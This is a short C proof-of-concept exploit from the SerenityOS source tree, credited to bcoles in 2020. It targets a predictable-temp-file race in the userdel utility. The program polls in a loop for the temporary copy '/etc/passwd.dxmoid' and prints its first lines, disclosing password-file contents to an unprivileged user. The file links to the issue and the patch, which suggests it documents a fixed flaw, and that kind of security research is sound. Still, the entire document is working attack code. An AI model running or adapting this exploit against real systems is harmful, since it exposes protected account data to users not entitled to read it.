/*
 * Copyright (c) 2020, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

// userdel predictable mkstemp race arbitrary file disclosure
// ---
// Details:
// - https://github.com/SerenityOS/serenity/issues/4089
// - https://github.com/SerenityOS/serenity/pull/4090
// Patch:
// - https://github.com/SerenityOS/serenity/pull/4502
// ---
// ~ bcoles 2020

#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifndef BUFSIZ
#    define BUFSIZ 4096
#endif

int main()
{
    FILE* fp = nullptr;
    const char* path = "/etc/passwd.dxmoid";

    while (true) {
        fp = fopen(path, "r");

        if (!fp)
            continue;

        printf("FILE: %s\n", path);
        for (int line = 0; line < 10; ++line) {
            char buffer[BUFSIZ];
            auto* str = fgets(buffer, sizeof(buffer), fp);
            if (!str)
                break;
            fputs(str, stdout);
        }

        fclose(fp);
        break;
    }

    return 0;
}

